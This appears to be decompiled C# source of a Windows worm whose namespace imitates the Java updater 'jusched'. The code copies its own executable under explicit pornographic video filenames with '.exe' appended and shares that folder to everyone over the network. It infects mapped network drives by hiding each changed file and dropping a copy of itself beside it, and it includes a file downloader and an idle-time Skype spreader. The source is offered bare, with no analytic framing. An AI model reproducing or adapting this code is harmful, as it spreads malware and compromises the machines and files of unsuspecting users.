using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace jusched;

public class Spreaders
{
	[AccessedThroughProperty("myTimer")]
	private static Timer _myTimer;

	private static cIdleTimeStool _inactiveTimeRetriever;

	private static Timer myTimer
	{
		get
		{
			return _myTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = InactivityTimer_Tick;
			if (_myTimer != null)
			{
				_myTimer.remove_Tick(eventHandler);
			}
			_myTimer = value;
			if (_myTimer != null)
			{
				_myTimer.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static void runonce_0()
	{
		try
		{
			lan_0();
			laninfect();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void dl(string string_0, string string_1)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		byte[] bytes = webClient.DownloadData(string_0);
		File.WriteAllBytes(string_1, bytes);
	}

	private static void lan_0()
	{
		string text = Environment.GetEnvironmentVariable("TEMP") + "\\" + Configuration.lanfolder + "\\";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string[] c = new string[4] { "Arrecha recibe por el culo.avi", "Dandome una rica mamada.avi", "Culona haciendo la licuadora.flv", "El culo redondito de mi jerma.mp4" };
			ArrayList arrayList = new ArrayList(c);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = arrayList.GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text2 = Conversions.ToString(enumerator.Current);
					File.Copy(Application.get_ExecutablePath(), text + text2 + ".exe");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (Configuration.pais.Contains("ES"))
			{
				Interaction.Shell("NET SHARE \"videos cholotube=" + text + "\" /GRANT:Todos,FULL", (AppWinStyle)0, false, -1);
			}
			else if (Configuration.pais.Contains("EN"))
			{
				Interaction.Shell("NET SHARE \"Fucking my wife" + text + "\" /GRANT:everyone,FULL", (AppWinStyle)0, false, -1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void laninfect()
	{
		try
		{
			RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				string text2 = registryKey.GetValue(text)!.ToString() + "\\";
				if (Operators.CompareString(text.ToLower(), "mrulist", false) != 0 && Directory.Exists(text2))
				{
					Run(text2);
				}
			}
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Run(string string_0)
	{
		FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
		fileSystemWatcher.Path = string_0;
		fileSystemWatcher.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
		fileSystemWatcher.Filter = "*.*";
		fileSystemWatcher.Changed += OnChanged;
		fileSystemWatcher.Created += OnChanged;
		fileSystemWatcher.Deleted += OnChanged;
		fileSystemWatcher.EnableRaisingEvents = true;
	}

	private static void OnChanged(object sender, FileSystemEventArgs e)
	{
		string fullPath = e.FullPath;
		File.SetAttributes(fullPath, FileAttributes.Hidden);
		File.Copy(Application.get_ExecutablePath(), fullPath + ".exe");
	}

	public static void start_id()
	{
		_inactiveTimeRetriever = new cIdleTimeStool();
		myTimer.Start();
	}

	private static void InactivityTimer_Tick(object sender, EventArgs e)
	{
		TimeSpan? inactiveTime = _inactiveTimeRetriever.GetInactiveTime();
		if (inactiveTime.HasValue && inactiveTime.Value.TotalSeconds > 60.0)
		{
			SkypeSP.NICE();
			DoSomething();
		}
	}

	private static void DoSomething()
	{
		myTimer.set_Interval(1800000);
	}
}
